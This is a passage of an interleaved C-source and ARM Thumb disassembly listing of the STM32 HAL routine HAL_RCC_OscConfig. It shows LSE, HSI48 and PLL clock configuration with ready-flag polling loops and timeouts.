 8004022:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004026:	4a07      	ldr	r2, [pc, #28]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8004028:	f043 0304 	orr.w	r3, r3, #4
 800402c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8004030:	4b04      	ldr	r3, [pc, #16]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8004032:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004036:	4a03      	ldr	r2, [pc, #12]	; (8004044 <HAL_RCC_OscConfig+0x504>)
 8004038:	f043 0301 	orr.w	r3, r3, #1
 800403c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8004040:	e014      	b.n	800406c <HAL_RCC_OscConfig+0x52c>
 8004042:	bf00      	nop
 8004044:	40021000 	.word	0x40021000
 8004048:	40007000 	.word	0x40007000
 800404c:	4b9a      	ldr	r3, [pc, #616]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 800404e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004052:	4a99      	ldr	r2, [pc, #612]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004054:	f023 0301 	bic.w	r3, r3, #1
 8004058:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 800405c:	4b96      	ldr	r3, [pc, #600]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 800405e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004062:	4a95      	ldr	r2, [pc, #596]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004064:	f023 0304 	bic.w	r3, r3, #4
 8004068:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 800406c:	687b      	ldr	r3, [r7, #4]
 800406e:	689b      	ldr	r3, [r3, #8]
 8004070:	2b00      	cmp	r3, #0
 8004072:	d016      	beq.n	80040a2 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004074:	f7fd f9e0 	bl	8001438 <HAL_GetTick>
 8004078:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800407a:	e00a      	b.n	8004092 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 800407c:	f7fd f9dc 	bl	8001438 <HAL_GetTick>
 8004080:	4602      	mov	r2, r0
 8004082:	693b      	ldr	r3, [r7, #16]
 8004084:	1ad3      	subs	r3, r2, r3
 8004086:	f241 3288 	movw	r2, #5000	; 0x1388
 800408a:	4293      	cmp	r3, r2
 800408c:	d901      	bls.n	8004092 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 800408e:	2303      	movs	r3, #3
 8004090:	e162      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004092:	4b89      	ldr	r3, [pc, #548]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004094:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004098:	f003 0302 	and.w	r3, r3, #2
 800409c:	2b00      	cmp	r3, #0
 800409e:	d0ed      	beq.n	800407c <HAL_RCC_OscConfig+0x53c>
 80040a0:	e015      	b.n	80040ce <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 80040a2:	f7fd f9c9 	bl	8001438 <HAL_GetTick>
 80040a6:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 80040a8:	e00a      	b.n	80040c0 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 80040aa:	f7fd f9c5 	bl	8001438 <HAL_GetTick>
 80040ae:	4602      	mov	r2, r0
 80040b0:	693b      	ldr	r3, [r7, #16]
 80040b2:	1ad3      	subs	r3, r2, r3
 80040b4:	f241 3288 	movw	r2, #5000	; 0x1388
 80040b8:	4293      	cmp	r3, r2
 80040ba:	d901      	bls.n	80040c0 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 80040bc:	2303      	movs	r3, #3
 80040be:	e14b      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 80040c0:	4b7d      	ldr	r3, [pc, #500]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80040c2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80040c6:	f003 0302 	and.w	r3, r3, #2
 80040ca:	2b00      	cmp	r3, #0
 80040cc:	d1ed      	bne.n	80040aa <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 80040ce:	7ffb      	ldrb	r3, [r7, #31]
 80040d0:	2b01      	cmp	r3, #1
 80040d2:	d105      	bne.n	80040e0 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80040d4:	4b78      	ldr	r3, [pc, #480]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80040d6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80040d8:	4a77      	ldr	r2, [pc, #476]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80040da:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80040de:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 80040e0:	687b      	ldr	r3, [r7, #4]
 80040e2:	681b      	ldr	r3, [r3, #0]
 80040e4:	f003 0320 	and.w	r3, r3, #32
 80040e8:	2b00      	cmp	r3, #0
 80040ea:	d03c      	beq.n	8004166 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 80040ec:	687b      	ldr	r3, [r7, #4]
 80040ee:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80040f0:	2b00      	cmp	r3, #0
 80040f2:	d01c      	beq.n	800412e <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 80040f4:	4b70      	ldr	r3, [pc, #448]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80040f6:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 80040fa:	4a6f      	ldr	r2, [pc, #444]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80040fc:	f043 0301 	orr.w	r3, r3, #1
 8004100:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004104:	f7fd f998 	bl	8001438 <HAL_GetTick>
 8004108:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 800410a:	e008      	b.n	800411e <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 800410c:	f7fd f994 	bl	8001438 <HAL_GetTick>
 8004110:	4602      	mov	r2, r0
 8004112:	693b      	ldr	r3, [r7, #16]
 8004114:	1ad3      	subs	r3, r2, r3
 8004116:	2b02      	cmp	r3, #2
 8004118:	d901      	bls.n	800411e <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 800411a:	2303      	movs	r3, #3
 800411c:	e11c      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 800411e:	4b66      	ldr	r3, [pc, #408]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004120:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004124:	f003 0302 	and.w	r3, r3, #2
 8004128:	2b00      	cmp	r3, #0
 800412a:	d0ef      	beq.n	800410c <HAL_RCC_OscConfig+0x5cc>
 800412c:	e01b      	b.n	8004166 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 800412e:	4b62      	ldr	r3, [pc, #392]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004130:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004134:	4a60      	ldr	r2, [pc, #384]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004136:	f023 0301 	bic.w	r3, r3, #1
 800413a:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 800413e:	f7fd f97b 	bl	8001438 <HAL_GetTick>
 8004142:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8004144:	e008      	b.n	8004158 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8004146:	f7fd f977 	bl	8001438 <HAL_GetTick>
 800414a:	4602      	mov	r2, r0
 800414c:	693b      	ldr	r3, [r7, #16]
 800414e:	1ad3      	subs	r3, r2, r3
 8004150:	2b02      	cmp	r3, #2
 8004152:	d901      	bls.n	8004158 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8004154:	2303      	movs	r3, #3
 8004156:	e0ff      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8004158:	4b57      	ldr	r3, [pc, #348]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 800415a:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 800415e:	f003 0302 	and.w	r3, r3, #2
 8004162:	2b00      	cmp	r3, #0
 8004164:	d1ef      	bne.n	8004146 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8004166:	687b      	ldr	r3, [r7, #4]
 8004168:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800416a:	2b00      	cmp	r3, #0
 800416c:	f000 80f3 	beq.w	8004356 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8004170:	687b      	ldr	r3, [r7, #4]
 8004172:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004174:	2b02      	cmp	r3, #2
 8004176:	f040 80c9 	bne.w	800430c <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 800417a:	4b4f      	ldr	r3, [pc, #316]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 800417c:	68db      	ldr	r3, [r3, #12]
 800417e:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8004180:	697b      	ldr	r3, [r7, #20]
 8004182:	f003 0203 	and.w	r2, r3, #3
 8004186:	687b      	ldr	r3, [r7, #4]
 8004188:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800418a:	429a      	cmp	r2, r3
 800418c:	d12c      	bne.n	80041e8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 800418e:	697b      	ldr	r3, [r7, #20]
 8004190:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8004194:	687b      	ldr	r3, [r7, #4]
 8004196:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004198:	3b01      	subs	r3, #1
 800419a:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 800419c:	429a      	cmp	r2, r3
 800419e:	d123      	bne.n	80041e8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 80041a0:	697b      	ldr	r3, [r7, #20]
 80041a2:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 80041a6:	687b      	ldr	r3, [r7, #4]
 80041a8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80041aa:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 80041ac:	429a      	cmp	r2, r3
 80041ae:	d11b      	bne.n	80041e8 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 80041b0:	697b      	ldr	r3, [r7, #20]
 80041b2:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 80041b6:	687b      	ldr	r3, [r7, #4]
 80041b8:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80041ba:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 80041bc:	429a      	cmp	r2, r3
 80041be:	d113      	bne.n	80041e8 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 80041c0:	697b      	ldr	r3, [r7, #20]
 80041c2:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 80041c6:	687b      	ldr	r3, [r7, #4]
 80041c8:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80041ca:	085b      	lsrs	r3, r3, #1
 80041cc:	3b01      	subs	r3, #1
 80041ce:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 80041d0:	429a      	cmp	r2, r3
 80041d2:	d109      	bne.n	80041e8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 80041d4:	697b      	ldr	r3, [r7, #20]
 80041d6:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 80041da:	687b      	ldr	r3, [r7, #4]
 80041dc:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80041de:	085b      	lsrs	r3, r3, #1
 80041e0:	3b01      	subs	r3, #1
 80041e2:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 80041e4:	429a      	cmp	r2, r3
 80041e6:	d06b      	beq.n	80042c0 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 80041e8:	69bb      	ldr	r3, [r7, #24]
 80041ea:	2b0c      	cmp	r3, #12
 80041ec:	d062      	beq.n	80042b4 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 80041ee:	4b32      	ldr	r3, [pc, #200]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80041f0:	681b      	ldr	r3, [r3, #0]
 80041f2:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 80041f6:	2b00      	cmp	r3, #0
 80041f8:	d001      	beq.n	80041fe <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 80041fa:	2301      	movs	r3, #1
 80041fc:	e0ac      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 80041fe:	4b2e      	ldr	r3, [pc, #184]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004200:	681b      	ldr	r3, [r3, #0]
 8004202:	4a2d      	ldr	r2, [pc, #180]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004204:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8004208:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 800420a:	f7fd f915 	bl	8001438 <HAL_GetTick>
 800420e:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004210:	e008      	b.n	8004224 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004212:	f7fd f911 	bl	8001438 <HAL_GetTick>
 8004216:	4602      	mov	r2, r0
 8004218:	693b      	ldr	r3, [r7, #16]
 800421a:	1ad3      	subs	r3, r2, r3
 800421c:	2b02      	cmp	r3, #2
 800421e:	d901      	bls.n	8004224 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8004220:	2303      	movs	r3, #3
 8004222:	e099      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004224:	4b24      	ldr	r3, [pc, #144]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004226:	681b      	ldr	r3, [r3, #0]
 8004228:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800422c:	2b00      	cmp	r3, #0
 800422e:	d1f0      	bne.n	8004212 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8004230:	4b21      	ldr	r3, [pc, #132]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004232:	68da      	ldr	r2, [r3, #12]
 8004234:	4b21      	ldr	r3, [pc, #132]	; (80042bc <HAL_RCC_OscConfig+0x77c>)
 8004236:	4013      	ands	r3, r2
 8004238:	687a      	ldr	r2, [r7, #4]
 800423a:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 800423c:	687a      	ldr	r2, [r7, #4]
 800423e:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8004240:	3a01      	subs	r2, #1
 8004242:	0112      	lsls	r2, r2, #4
 8004244:	4311      	orrs	r1, r2
 8004246:	687a      	ldr	r2, [r7, #4]
 8004248:	6b52      	ldr	r2, [r2, #52]	; 0x34
 800424a:	0212      	lsls	r2, r2, #8
 800424c:	4311      	orrs	r1, r2
 800424e:	687a      	ldr	r2, [r7, #4]
 8004250:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8004252:	0852      	lsrs	r2, r2, #1
 8004254:	3a01      	subs	r2, #1
 8004256:	0552      	lsls	r2, r2, #21
 8004258:	4311      	orrs	r1, r2
 800425a:	687a      	ldr	r2, [r7, #4]
 800425c:	6c12      	ldr	r2, [r2, #64]	; 0x40
 800425e:	0852      	lsrs	r2, r2, #1
 8004260:	3a01      	subs	r2, #1
 8004262:	0652      	lsls	r2, r2, #25
 8004264:	4311      	orrs	r1, r2
 8004266:	687a      	ldr	r2, [r7, #4]
 8004268:	6b92      	ldr	r2, [r2, #56]	; 0x38
 800426a:	06d2      	lsls	r2, r2, #27
 800426c:	430a      	orrs	r2, r1
 800426e:	4912      	ldr	r1, [pc, #72]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004270:	4313      	orrs	r3, r2
 8004272:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8004274:	4b10      	ldr	r3, [pc, #64]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004276:	681b      	ldr	r3, [r3, #0]
 8004278:	4a0f      	ldr	r2, [pc, #60]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 800427a:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800427e:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004280:	4b0d      	ldr	r3, [pc, #52]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004282:	68db      	ldr	r3, [r3, #12]
 8004284:	4a0c      	ldr	r2, [pc, #48]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 8004286:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800428a:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 800428c:	f7fd f8d4 	bl	8001438 <HAL_GetTick>
 8004290:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004292:	e008      	b.n	80042a6 <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004294:	f7fd f8d0 	bl	8001438 <HAL_GetTick>
 8004298:	4602      	mov	r2, r0
 800429a:	693b      	ldr	r3, [r7, #16]
 800429c:	1ad3      	subs	r3, r2, r3
 800429e:	2b02      	cmp	r3, #2
 80042a0:	d901      	bls.n	80042a6 <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 80042a2:	2303      	movs	r3, #3
 80042a4:	e058      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80042a6:	4b04      	ldr	r3, [pc, #16]	; (80042b8 <HAL_RCC_OscConfig+0x778>)
 80042a8:	681b      	ldr	r3, [r3, #0]
 80042aa:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80042ae:	2b00      	cmp	r3, #0
 80042b0:	d0f0      	beq.n	8004294 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 80042b2:	e050      	b.n	8004356 <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 80042b4:	2301      	movs	r3, #1
 80042b6:	e04f      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
 80042b8:	40021000 	.word	0x40021000
 80042bc:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80042c0:	4b27      	ldr	r3, [pc, #156]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 80042c2:	681b      	ldr	r3, [r3, #0]
 80042c4:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80042c8:	2b00      	cmp	r3, #0
 80042ca:	d144      	bne.n	8004356 <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 80042cc:	4b24      	ldr	r3, [pc, #144]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 80042ce:	681b      	ldr	r3, [r3, #0]
 80042d0:	4a23      	ldr	r2, [pc, #140]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 80042d2:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80042d6:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 80042d8:	4b21      	ldr	r3, [pc, #132]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 80042da:	68db      	ldr	r3, [r3, #12]
 80042dc:	4a20      	ldr	r2, [pc, #128]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 80042de:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80042e2:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 80042e4:	f7fd f8a8 	bl	8001438 <HAL_GetTick>
 80042e8:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80042ea:	e008      	b.n	80042fe <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80042ec:	f7fd f8a4 	bl	8001438 <HAL_GetTick>
 80042f0:	4602      	mov	r2, r0
 80042f2:	693b      	ldr	r3, [r7, #16]
 80042f4:	1ad3      	subs	r3, r2, r3
 80042f6:	2b02      	cmp	r3, #2
 80042f8:	d901      	bls.n	80042fe <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 80042fa:	2303      	movs	r3, #3
 80042fc:	e02c      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80042fe:	4b18      	ldr	r3, [pc, #96]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 8004300:	681b      	ldr	r3, [r3, #0]
 8004302:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004306:	2b00      	cmp	r3, #0
 8004308:	d0f0      	beq.n	80042ec <HAL_RCC_OscConfig+0x7ac>
 800430a:	e024      	b.n	8004356 <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 800430c:	69bb      	ldr	r3, [r7, #24]
 800430e:	2b0c      	cmp	r3, #12
 8004310:	d01f      	beq.n	8004352 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 8004312:	4b13      	ldr	r3, [pc, #76]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 8004314:	681b      	ldr	r3, [r3, #0]
 8004316:	4a12      	ldr	r2, [pc, #72]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 8004318:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 800431c:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 800431e:	f7fd f88b 	bl	8001438 <HAL_GetTick>
 8004322:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004324:	e008      	b.n	8004338 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004326:	f7fd f887 	bl	8001438 <HAL_GetTick>
 800432a:	4602      	mov	r2, r0
 800432c:	693b      	ldr	r3, [r7, #16]
 800432e:	1ad3      	subs	r3, r2, r3
 8004330:	2b02      	cmp	r3, #2
 8004332:	d901      	bls.n	8004338 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8004334:	2303      	movs	r3, #3
 8004336:	e00f      	b.n	8004358 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004338:	4b09      	ldr	r3, [pc, #36]	; (8004360 <HAL_RCC_OscConfig+0x820>)
 800433a:	681b      	ldr	r3, [r3, #0]
 800433c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004340:	2b00      	cmp	r3, #0
